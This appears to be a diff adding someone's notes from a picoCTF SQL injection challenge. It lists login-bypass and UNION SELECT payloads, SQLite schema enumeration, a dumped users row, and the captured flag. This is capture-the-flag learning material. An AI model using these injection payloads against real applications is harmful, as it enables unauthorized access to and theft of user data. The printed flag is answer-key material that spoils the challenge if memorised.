@@ -1,0 +1,35 @@
+SELECT id FROM users WHERE password = 'pass' AND username = 'user'
+SELECT id FROM users WHERE password = '' OR 1=1; -- pass' AND username = 'user'
+
+QUERY 1 (password field): ' OR 1=1; --
+
+SELECT city FROM offices WHERE city = '' UNION SELECT * FROM users; --';
+
+QUERY 2: ' UNION SELECT * FROM users; --
+
+Obtained row
+admin	moreRandOMN3ss	1
+
+Can't seem to login?
+Reason: the "password" is actually not a password, just garbage
+
+log back in with original SQL inject
+
+QUERY: ' UNION SELECT * FROM pragma_database_list; --
+0	main	/app/users.db
+
+QUERY: ' UNION SELECT name,1,1 FROM sqlite_master; --
+hints	1	1
+more_table	1	1
+offices	1	1
+sqlite_autoindex_users_1	1	1
+users	1	1
+
+// SELECT city FROM offices WHERE city = '' UNION SELECT * FROM users; --';
+
+TEST QUERY: ' UNION ALL SELECT city,address,phone FROM offices; --
+QUERY: ' UNION ALL SELECT sql,'a',1 FROM sqlite_master; --
+
+' UNION ALL SELECT flag,'a',1 FROM more_table; --
+picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}	a	1
+If you are here, you must have seen it	a	1
